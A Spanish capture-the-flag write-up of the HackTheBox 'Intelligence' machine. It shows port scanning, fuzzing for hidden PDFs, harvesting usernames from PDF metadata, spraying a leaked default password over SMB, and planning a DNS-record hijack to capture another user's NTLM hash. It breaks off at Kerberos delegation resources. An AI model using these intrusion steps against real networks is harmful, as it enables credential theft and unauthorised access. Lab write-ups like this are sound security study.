---
layout      : post
title       : "HackTheBox - Intelligence"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357banner.png
category    : [ htb ]
tags        : [ service-account, kerberos, delegation-attack, DNS, PScript, SMBRelay ]
---
Máquina **Windows** nivel medio. Fuzzeito lindo para encontrar archivos **PDF** y juegos sucios con su metadata. Gafas bien puestas contra scripts de **PowerShell**, temitas de **DNS** e interacción con **Service Accounts**.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357intelligenceHTB.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [Micah](https://www.hackthebox.eu/profile/22435).

Personas personificadas.

Encontraremos un servicio web con algunos objetos `.PDF`, tendremos que profundizar en sus nombres y fuzzear para descubrir nuevos **PDFs**. Dos de ellos con contenido interesante, uno con credenciales por default para los nuevos usuarios y el otro informando problemas a ser resueltos por el equipo de soporte.

Aprovechando la contraseña y la metadata de los objetos **PDF** obtendremos sus creadores, tomándolos como usuarios lograremos un match de credenciales contra el usuario `Tiffany.Molina`, nos serán válidas para ver el contenido de las carpetas compartidas por `SMB` y obtendremos un script de `PowerShell` bastante juguetón.

El script hace peticiones web llevadas a cabo por un usuario llamado `Ted.Graves` para validar el status del servidor, usando `Kerberos` y los ataques para personificar acciones de los usuarios (`Delegation Attacks`) lograremos añadir un nuevo registro al servidor `DNS` que resuelva hacia nuestra máquina, interceptaremos la petición que hace el script y obtendremos las credenciales (hash `NTLMv2`) de **Ted**. Finalmente, las crackearemos y tendremos en texto plano su contraseña.

Indagando y jugando con los **PDFs** encontrados al inicio, vamos a explorar el mundo de las `service accounts`, jugando con ellas vamos a personificar cualquier usuario mediante `Service Tickets`, logrando así interacción total contra otros recursos como X usuario, usaremos esto para obtener una `CMD` en el sistema como `Administrator` tanto con `psexec` como con `wmiexec`.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357rating.png" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357statistics.png" style="width: 80%;"/>

Tira mucho a la realidad y hay que investigar bastante.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Let's suppose that you're able every night to dream any dream that you want to dream.

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Vemos que hay en el servidor web del puerto 80](#puerto-80).
  * [Fuzzeamos el servidor web buscando archivos llamativos](#fuzz-pdfs).
3. [Explotación](#explotacion).
  * [Descubrimos nuevos creadores de contenido en archivos **PDF** (nombres)](#oneliner-exiftool).
  * [Leemos el contenido de los archivos **PDF**](#cat-pdfs).
  * [Encontramos credenciales válidas contra **SMB**](#fuzz-creds-smb).
4. [Movimiento lateral (PowerShell Script): **Tiffany** -> **Ted**](#ps-script).
  * [Hacemos que **Ted** se comunique con nosotros e interceptamos su conexión](#ps-dns).
5. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Vamos a empezar descubriendo que puertos tiene abiertos la máquina, con esto logramos saber contra qué servicio podemos interactuar y en dado caso atacar. Usaremos `nmap` para este propósito:

```bash
❱ nmap -p- --open -v 10.10.10.248 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](../../assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

El escaneo nos devuelve:

```bash
# Nmap 7.80 scan initiated Tue Aug 31 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.248
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.248 ()	Status: Up
Host: 10.10.10.248 ()	Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49691/open/tcp/////, 49692/open/tcp/////, 49714/open/tcp/////, 54750/open/tcp/////	Ignored State: filtered (65517)
# Nmap done at Tue Aug 31 25:25:25 2021 -- 1 IP address (1 host up) scanned in 384.01 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 53     | **[DNS](https://book.hacktricks.xyz/pentesting/pentesting-dns)**: Protocolo para la resolución de dominios, así logramos que una IP deba responder cuando se consulta por su dominio. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos ofrece un servidor web. |
| 88 | **[Kerberos](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)**: Protocolo de autenticación. |
| 135    | **[RPC](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)**: Este protocolo ayuda a la comunicación entre programas de distintos computadores. |
| 139/445 | **[SMB](https://www.varonis.com/blog/smb-port/)**: Protocolo para compartir información en una red. |
| 389/636/3269 | **[LDAP](https://book.hacktricks.xyz/pentesting/pentesting-ldap)**: Este protocolo ayuda a encontrar -recursos- sobre una red. |
| 464    | [Kerberos Password Change](https://security.stackexchange.com/questions/205492/what-is-this-service) |
| 593 | No sabemos muy bien |
| 5985   | **[WinRM](https://www.pcwdld.com/what-is-winrm)**: Se usa para ejecutar tareas administrativas sobre una red. |
| 9389   | **[Active Directory Administrative Center](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-administrative-center)** |
| 49667/49691 | No sabemos. | 
| 49692/49714 | No sabemos |
| 54750 | No sabemos |

Bien, varios servicios (que ya nos van indicando un posible **controlador de dominio**), pues sigamos usando `nmap`, pero ahora para profundizar sobre ellos y descubrir que software o versión están corriendo cada uno, así mismo aprovechamos los scripts que tiene **nmap** para ver si descubren algo más...

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.248
    [*] Open ports: 53,80,88,135,139,389,445,464,593,636,3269,5985,9389,49667,49691,49692,49714,54750

[*] Ports copied to clipboard
```

**)~**

Y ahora con `nmap`:

```bash
❱ nmap -p 53,80,88,135,139,389,445,464,593,636,3269,5985,9389,49667,49691,49692,49714,54750 -sC -sV 10.10.10.248 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Finalmente obtenemos:

```bash
# Nmap 7.80 scan initiated Tue Aug 31 25:25:25 2021 as: nmap -p 53,80,88,135,139,389,445,464,593,636,3269,5985,9389,49667,49691,49692,49714,54750 -sC -sV -oN portScan 10.10.10.248
Nmap scan report for 10.10.10.248
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-31 20:32:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-31T20:35:41+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-31T20:35:42+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-31T20:35:42+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
54750/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=8/31%Time=612E2F7E%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"...
SF:x04bind...x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-31T20:35:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 31 25:25:25 2021 -- 1 IP address (1 host up) scanned in 191.02 seconds
```

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Microsoft IIS httpd 10.0 |
| 389/636/3269 | LDAP     | Active Directory LDAP |

Vemos dos dominios:

* `intelligence.htb`.
* `dc.intelligence.htb`.

Y uno de ellos con un diminutivo a `Domain Controller`, así que confirmamos que estamos en un directorio activo, ya veremos que es esto (:

Por ahora no vemos nada más, empecemos a profundizar.

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Vemos que hay en el puerto 80 [📌](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357page80.png" style="width: 100%;"/>

Vemos una página web bastante linda :P

Con lo único con lo que podemos interactuar es con estos dos **links**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357page80_downloadLinks.png" style="width: 100%;"/>

Los cuales nos llevan a:

* **Anouncement Document**: `http://10.10.10.248/documents/2020-01-01-upload.pdf`.
* **Other Document**: `http://10.10.10.248/documents/2020-12-15-upload.pdf`.

En su contenido no hay nada relevante, peeeeeeeeeeero si probamos a descargarlos y ver su metadata, quizás tengamos las fechas de creación, el programa con que fueron hechos o mejor aún, el creador del archivo.

```bash
❱ curl http://10.10.10.248/documents/2020-01-01-upload.pdf -o 2020-01-01-upload.pdf
❱ curl http://10.10.10.248/documents/2020-12-15-upload.pdf -o 2020-12-15-upload.pdf
```

Y usando por ejemplo la herramienta [exiftool](https://exiftool.org/) podemos ver lo dicho, la metadata del archivo (información que se guarda junto al objeto con respecto al entorno donde se generó el mismo):

```bash
❱ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 11.97
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2021:08:31 25:15:15-05:00
File Access Date/Time           : 2021:08:31 15:25:15-05:00
File Inode Change Date/Time     : 2021:08:31 15:15:25-05:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```

De todos los campos claramente hay uno llamativo:

```bash
Creator                         : William.Lee
```

Es un objeto que fue subido directamente a la web oficial del sitio, por lo que podemos pensar que `William Lee` sea algún colaborador de la empresa, poooooooor lo tanto, quizás sea un **usuario** de algo, guardémoslo (:

Revisando el otro objeto también tenemos el campo `Creator`:

```bash
❱ exiftool 2020-12-15-upload.pdf
File Name                       : 2020-12-15-upload.pdf
...
Creator                         : Jose.Williams
```

Ahora tenemos a `Jose Williams`,  mismo pensamiento, misma acción, guardémoslo por si algo...

No encontramos nada más en la web, así que sigamos explorando.

...

Agreguemos el dominio `intelligence.htb` a nuestro archivo [/etc/hosts](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html), así logramos que cuando hagamos peticiones al dominio nos responda según el contenido que tenga al comunicarse con la IP.

```bash
❱ cat /etc/hosts
..
10.10.10.248  intelligence.htb
...
```

Pero en la web vemos el mismo contenido de antes...

Algo que podemos intentar es descubrir (si es que lo hay) directorios o archivos que la página web esté sirviendo, pero que no se encuentren a simple vista (un **fuzzing** de toda la vida :P), intentémoslo en este caso con la herramienta `wfuzz`:

```bash
❱ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://intelligence.htb/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                        
=====================================================================

000001514:   301        1 L      10 W       157 Ch      "documents"                                                                                                                    
000002180:   200        129 L    430 W      7432 Ch     "index.html"
...
```

Tenemos la ruta `documents/` (que ya la habíamos visto con los archivos `.pdf`) y nada más (después de probar con más diccionarios claramente 😄)...

Intentando fuzzear dentro de `documents/` no encontramos nada.

...

# Explotación [#](#explotacion) {#explotacion}

...

## Fuzzeamos en busca de más archivos <u>.PDF</u> [📌](#fuzz-pdfs) {#fuzz-pdfs}

Acá recordé los archivos `.pdf` y me fijé en sus nombres:

```html
http://intelligence.htb/documents/2020-01-01-upload.pdf
http://intelligence.htb/documents/2020-12-15-upload.pdf
```

Lo que se me vino a la mente al ver las dos **URLs** es que hay un rango de fechas bastante grande entre cada objeto, esto puede no ser relevante, pero me dio la idea de intentar fuzzear por fechas, quizás existan más archivos `.PDF`, pero que no listados en la web, así que probemos:

Para esto me cree dos archivos, uno llamado `days.txt` y otro `months.txt`, para automatizar la lista de números podemos usar el comando `seq` (secuenciador) que nos imprime una lista de números con base en el rango que le indiquemos:

```bash
❱ seq 1 3
1
2
3
```

Pero si nos fijamos en los archivos `.PDF`, su formato es, por ejemplo: `01` y no `1`. Podemos usar el parámetro `-w` de `seq` para que nos rellene de ceros según el tamaño del numero más grande:

```bash
❱ seq -w 1 9
1
...
9
❱ seq -w 1 10
01
...
09
10
```

Pues ahora sí, generemos los **31 días** y los **12 meses**:

```bash
❱ seq -w 1 31 > days.txt
❱ seq -w 1 12 > months.txt
```

Listones, pues aprovechando `wfuzz` y su opción de usar varios diccionarios, podemos decirle que juegue con los dos archivos e intente fuzzear con ellos:

Lo que queremos lograr es que cada petición que haga sea así:

```html
http://intelligence.htb/documents/2020-01-01-upload.pdf
http://intelligence.htb/documents/2020-01-02-upload.pdf
...
http://intelligence.htb/documents/2020-05-18-upload.pdf
http://intelligence.htb/documents/2020-05-19-upload.pdf
...
<!-- Y así con tooodos los meses y sus respectivos días... -->
```

Nuestro comando quedaría así:

```bash
❱ wfuzz -c --hc=404 -w months.txt -w days.txt http://intelligence.htb/documents/2020-FUZZ-FUZ2Z-upload.pdf
```

Ejecutémoslo y veamos si hay algo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_fuzzPDFs_foundOTHERfile.png" style="width: 100%;"/>

OPAAAAAAAAAAAA, encuentra cositas, (bastanteees) podríamos validar algunos a ver si son reales, tomemos el `01-20`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357page80_PDF_01-20.png" style="width: 100%;"/>

Pues si existe (y probando con otros también), hagamos el mismo proceso de antes, juguemos con `exiftool` pa ver la metadata:

```bash
❱ exiftool 2020-01-20-upload.pdf 
...
File Name                       : 2020-01-20-upload.pdf
...
Creator                         : Jennifer.Thomas
```

Ojo, tenemos nuevo nombre, con lo que nos pone a dudar si los otros **PDFs** también tengas distintos creadores, automaticemos todo esto con un **oneliner** en `bash` y descubrámoslo:

---

## Enumerando creadores (nombres) de los <u>PDFs</u> [📌](#oneliner-exiftool) {#oneliner-exiftool}

Aprovechemos este output:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_fuzzPDFs_foundOTHERfile.png" style="width: 100%;"/>

Para generar un archivo con únicamente las fechas de los nuevos `PDFs`, así es más fácil después jugar con `cURL` y `exiftool`:

(Yo hice la copia de las líneas con la funcionalidad de `tmux`, usando `wfuzz ... > .txt` hace cosas extrañas)

```bash
❱ cat dates_found.txt
000000001:   200        208 L    1172 W     25532 Ch    "01 - 01"
000000010:   200        204 L    1130 W     25159 Ch    "01 - 10"
...
```

Nos quedamos con las columnas numero `9` y `11` (separadas por espacios):

```bash
❱ cat dates_found.txt | awk '{print $9"-"$11}'
"01-01"
"01-10"
...
```

Y quitamos los `"`:

```bash
❱ cat dates_found.txt | awk '{print $9"-"$11}' | tr -d '"' | head
01-01
01-10
...
```

Este output ya nos sirve, guardémoslo:

```bash
❱ cat dates_found.txt | awk '{print $9"-"$11}' | tr -d '"' > dates_found.txt.bak
❱ rm dates_found.txt
❱ mv dates_found.txt.bak dates_found.txt
❱ cat dates_found.txt | head
01-01
01-10
...
```

Listos, ahora sí, hagamos una instrucción en la propia terminal (un oneliner) usando un `for` que lea cada línea de ese archivo (estaría guardada en la variable `i`), así podemos hacer cositas con ella:

```bash
❱ for i in $(cat dates_found.txt); do <lo_que_queramos_hacer>; done
```

Lo que queremos hacer es:

* Una petición hacia el `PDF`.
* Guardarnos el **PDF** en el sistema.
* Tomar el **PDF** y ejecutarle: `exiftool <pdf>`.
* Filtramos por el campo `Creator` y así obtener finalmente el creador del **PDF**.

Nos quedaría así:

```bash
❱ curl -s http://intelligence.htb/documents/2020-01-01-upload.pdf -o 01-01; exiftool 01-01 | grep Creator | awk '{print $3}'
❱ for i in $(cat dates_found.txt); do curl -s http://intelligence.htb/documents/2020-$i-upload.pdf -o $i; exiftool $i | grep Creator | awk '{print $3}'; rm $i; done
```

Ejecutamos yyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_oneliner_extractCreatorsPDFs.png" style="width: 100%;"/>

Ta bueno, vemos demasiados nombres, guardémoslos en un archivo:

```bash
❱ for i in $(cat dates_found.txt); do curl ... awk '{print $3}' >> creators.txt; rm $i; done
```

Y ya tendríamos un objeto con tooooooooodos los creadores (recuerden, podemos pensar en ellos como usuarios, así que son super importantes), solo que algunos se repiten, para quitarlos usamos el comando `sort` para ordenar el archivo y el parámetro `-u` para que se quede con lo **u**nicos:

```bash
❱ cat creators.txt | sort -u
❱ cat creators.txt | sort -u > creators.txt.bak
❱ rm -r creators.txt
❱ mv creators.txt.bak creators.txt
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_creatorsTXT.png" style="width: 100%;"/>

Y ahora sí, tamos finos.

---

## Leemos el contenido de los archivos <u>PDF</u> [📌](#cat-pdfs) {#cat-pdfs}

Claramente, no podemos irnos sin ver que hay en los **PDF**, ya vimos que tres de ellos tienen contenido random en latin, pero ¿será que pasa en todos?, quitémonos la duda:

> Nos apoyamos de la herramienta `pdftotext` para pasar el `PDF` a `TXT` y leerlo desde consola.

```bash
❱ curl -s http://intelligence.htb/documents/2020-01-01-upload.pdf -o 01-01; pdftotext 01-01; cat 01-01.txt
❱ for i in $(cat dates_found.txt); do curl -s http://intelligence.htb/documents/2020-$i-upload.pdf -o $i; pdftotext $i; cat $i.txt; sleep 1; rm $i*; done
```

Lo ejecutamos, va a tomar su tiempo en terminar, ya que son varios archivos, pero si prestamos atención entre ellos, vemos dos objetos con contenido llamativo:

💥 **2020-06-04-upload.pdf (06-04)**

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_PDF_credentialsFOUND_06-04.png" style="width: 100%;"/>

💥 **2020-12-30-upload.pdf (12-30)**

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_PDF_internalITmsg_12-30.png" style="width: 100%;"/>

En `06-04` le da la bienvenida a los nuevos usuarios de la compañía, les indica que por favor inicien sesión usando el usuario asignado y la X contraseña, pero les avisa que por favor cambien lo más rápido posible esa contraseña.

Esto último es interesante porque vemos que es un una password por default para tooooooodas las nuevas cuentas, pueda que entre muuuuuuuuuchos usuarios alguno se haya olvidado de cambiarla o incluso le haya dado pereza. Esto nos viene de perlas, ya que contamos con muuuuuuuchos nombres y una contraseña para probar...

Y en `12-30` habla de unas fallitas en la web, también de que "**Ted**" (no lo tenemos en nuestra lista de creadores, agreguémoslo por si algo) creo un script para ayudar a detectar si vuelven a pasar cositas extrañas en la web yyyyyyyyy que están en proceso de bloquear las -cuentas de servicio- después de lo encontrado en la última auditoria.

👥 ***A <u>Microsoft service account</u> is an account used to run one or more services or applications in a Windows environment.*** [Service Account Best Practices](https://www.quest.com/community/blogs/b/microsoft-platform-management/posts/microsoft-service-accounts-10-best-practices)

Hemos encontrado vaaarias locuras, enfoquémonos primero en la parte de nombres y la contraseña.

---

## Encontramos credenciales válidas contra <u>SMB</u> [📌](#fuzz-creds-smb) {#fuzz-creds-smb}

Podemos probar inicialmente los creadores con sus nombres, si no obtenemos nada, empezamos a jugar con [distintas combinaciones](https://activedirectorypro.com/active-directory-user-naming-convention/) que se encuentran mucho en entornos de **directorio activo**, como:

```bash
William.Lee
W.Lee
w.lee
williamlee
wlee
...
```

💂‍♂️ ***<u>Directorio Activo</u>: Lo que es capaz de hacer este directorio activo es proporcionar un servicio ubicado en uno o varios servidores capaz de crear objetos como usuarios, equipos o grupos para administrar las credencias durante el inicio de sesión de los equipos que se conectan a una red. Y también podremos administrar las políticas de absolutamente toda la red en la que se encuentre este servidor.*** [Active Directory - ¿Qué es y para qué sirve?](https://www.profesionalreview.com/2018/12/15/active-directory/).

Usemos `crackmapexec` y el servicio `SMB`, así vemos si alguna credencial es válida para listar carpetas compartidas.

Le decimos que tome cada nombre del archivo como un usuario y pruebe con él:

```bash
❱ crackmapexec smb 10.10.10.248 -u creators.txt -p 'NewIntelligenceCorpUser9876'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_cme_credentialsFound.png" style="width: 100%;"/>

Opaaa, la contraseña es válida con el usuario `Tiffany.Molina` (: Pues veamos a que podemos acceder con ellas...

Finalmente, nos son útiles para listar carpetas compartidas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_smbmapWITHtiffany.png" style="width: 100%;"/>

Tenemos acceso de lectura a algunos directorios, pero hay dos llamativos: `IT` y `Users`.

...

# Analizamos y explotamos tarea de <u>Ted</u> [#](#ps-script) {#ps-script}

Dando un vistazo lo único interesante se encuentra en `IT` y sería este objeto (script), que si recordamos el último **PDF** nos habla de **Ted** y un **script** para controlar cositas extrañas en la web, así que toma fuerza el revisarlo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/intelligence/357bash_smbclientWITHtiffany_IT_PScript.png" style="width: 100%;"/>

Descarguémoslo y veamos de que se trata:

```bash
smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (2,3 KiloBytes/sec) (average 2,3 KiloBytes/sec)
```

Y su contenido seria:

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 

foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
    try {
        $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
        if(.StatusCode -ne 200) {
            Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
        }
    } 
    catch {
    }
}
```

<span style="color: yellow;">1. </span>Es un script que se ejecuta cada **5 minutos** y lo usa para validar el estado del servidor web.

Usa el módulo `ActiveDirectory` (*pa averiguar*).

<span style="color: yellow;">2. </span>Hace un bucle entre los registros que le devuelva la consulta hacía:

* `DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` 

  (*también pa inspeccionar*).

Y por cada resultado toma únicamente los que en su nombre empiecen con la cadena `web`.

<span style="color: yellow;">3. </span>Y lo que hace es tomar el "record" (que intuyo será el dominio (o dirección **IP** asociada)) y le hace una petición `GET` para saber si la web esta activa.

Algo llamativo es que para hacer la consulta, **Ted** usa sus credenciales actuales, o sea con las que esta dentro del sistema (*esto también esta interesante*).

Si la respuesta no es un **200 Ok**, usa la clase `Send-MailMessage` y se envía un mensaje el mismo avisándose que el servidor web esta caído y hay que 🏃 🏃‍♀️ (*y otro más que se suma a las cositas pa profundizar*)

---

## Hacemos que <u>Ted</u> se comunique con nosotros [📌](#ps-dns) {#ps-dns}

Un script sencillo, pero con algunas líneas llamativas, después de divagar y perder un poco de tiempo relacionado con `Send-MailMessage` (que es una clase obsoleta), finalmente nos direccionamos.

⛺ **El vector es claro, <u>Ted</u> esta haciendo consultas web contra todos los dominios/IPs de los servidores que empiecen con nombre `web`, por lo que podemos buscar la manera de agregar un registro `DNS` (un subdominio e IP al host `intelligence.htb`) que su nombre empiece por `web` yyyy que de alguna manera el dominio/IP este relacionado con nosotros, así cuando `Ted` envíe la petición, se estaría comunicando con nosotros, tiene sentido ¿no?**

Lo que no es claro es como hacerlo.

> Si quisieramos ver la consulta que hace el script en vivo, podemos ejecutar esta linea:
>
> ```bash
> ❱ ldapsearch -h 10.10.10.248 -D 'intelligence\Tiffany.Molina' -w 'NewIntelligenceCorpUser9B7G' -b "DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | grep web
> ```

(Acá vamos a concatenar googleadas) Buscando y buscando recursos sobre **service accounts** (el tema hablado en el último **PDF**) y temas de **DNS**, llegamos finalmente a esta lista de posts:

* [QOMPLX Knowledge](https://www.qomplx.com/qomplx-knowledge/).

En ella la mayoría son de **Kerberos** (el protocolo de autenticación) y recorriendo cada artículo (al no saber que hacer) hay uno que su descripción nos llama la atención:

🐕 ***The Kerberos delegation feature in Active Directory (AD) is an impersonation type present since AD was introduced in Windows 2000. <u>Delegation allows service accounts or servers to impersonate other users and access services on different machines</u>.*** [Kerberos Delegation Attacks Explained](https://www.qomplx.com/qomplx-knowledge-kerberos-delegation-attacks-explained/)

* [Explicación muy buena de **Kerberos**](https://www.varonis.com/blog/kerberos-authentication-explained/).

Bastante interesante, un feature que permite a un usuario del directorio activo (AD) ejecutar acciones como otro(s) usuario(s) sobre ese AD (básicamente para tener acceso a otros servicios). 

Los ataques de los que se aprovecha este feature se hacen llamar: `Delegation Attacks`. 

Pero ¿nos sirve de algo saber esto? Superficialmente no, peeeeeeeeeeeeeeeeeeeeeeeeero si profundizamos en los ataques que podemos hacer, encontramos estos recursos y algunas herramientas interesantes:

* [Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html).
* [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html).
* [“Relaying” Kerberos - Having fun with unconstrained delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/).
* [Delegation Abuse - S4U2Pwnage](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/).

Básicamente como ya dijimos, la explotación del feature es basada en personificar otros usuarios, hablaremos rápidamente de dos tipos de personificación, por lo tanto, de ataques:

* Unconstrained Delegation:

  En el proceso de personificación no se limita a que recursos/servicios puede acceder la máquina o cuenta que la realiza, lo cual es bastaaaaaaaaante WTF y riesgoso.

* Constrained Delegation:

  Acá Windows se dio cuenta de que no limitar a que servicios una cuenta puede acceder es un pelin peligroso. Pues crearon esta extensión para que cada Admin gestione a que servicios puede acceder una cuenta o máquina que esta generando una personificación.

Claramente, si quieres profundizar puedes usar cualquiera de los recursos antes citados, están muy buenos.

Entre los artículos, encontramos que [redxorblue](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html) y [dirkjanm](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/) están usando un repo bastante llamativo, creado justamente por [dirkjanm](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/):

* [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx).

